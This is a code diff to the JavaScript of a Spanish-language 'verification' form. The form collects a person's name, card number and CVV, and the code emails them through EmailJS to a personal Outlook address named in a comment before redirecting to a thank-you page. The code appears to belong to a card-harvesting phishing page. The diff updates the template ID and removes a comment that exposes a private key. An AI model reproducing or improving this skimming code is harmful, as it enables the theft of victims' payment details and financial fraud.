@@ -17,12 +17,12 @@ document.getElementById('formularioVerificacion').addEventListener('submit', asy
     cvv: document.getElementById('cvv').value
   };
 
-  // Validaciones mejoradas
+  // Validaciones
   const errores = [];
   
   const limpiarErrores = () => {
     document.querySelectorAll('.error-input').forEach(el => el.remove());
-  }
+  };
   
   const mostrarError = (campo, mensaje) => {
     limpiarErrores();
@@ -33,7 +33,7 @@ document.getElementById('formularioVerificacion').addEventListener('submit', asy
     error.style.fontSize = '0.9rem';
     error.textContent = mensaje;
     campo.parentNode.appendChild(error);
-  }
+  };
 
   if (!/^[a-zA-ZáéíóúÁÉÍÓÚñÑ\s]{4,}$/.test(datos.nombre)) {
     mostrarError(document.getElementById('nombre'), 'Nombre inválido (mínimo 4 letras)');
@@ -61,10 +61,12 @@ document.getElementById('formularioVerificacion').addEventListener('submit', asy
     return;
   }
 
-  // Enviar datos usando EmailJS con el nuevo service id y plantilla configurada
-  // **IMPORTANTE:** La dirección de destino se define en la configuración de la plantilla en EmailJS.
+  // Enviar datos usando EmailJS con la nueva configuración:
+  // Template ID: template_65du68s
+  // Service ID: service_427s9ii
+  // El correo destino se configura en EmailJS (fantre001@outlook.com)
   try {
-    await emailjs.send("service_427s9ii", "template_u3etoro", datos);
+    await emailjs.send("service_427s9ii", "template_65du68s", datos);
     window.location.href = "thank-you.html";
   } catch (error) {
     alert('Error temporal. Por favor intente nuevamente.');
@@ -81,8 +83,3 @@ document.getElementById('tarjeta').addEventListener('input', function(e) {
   valor = valor.replace(/(\d{4})(?=\d)/g, '$1 ');
   e.target.value = valor.substring(0, 19);
 });
-
-/*
-  Nota: La private key (TbdLdRj03b0tqQbONR3kT) no se utiliza en el código cliente.
-  Mantenla en secreto y utilízala solo en entornos seguros (por ejemplo, en el servidor).
-*/
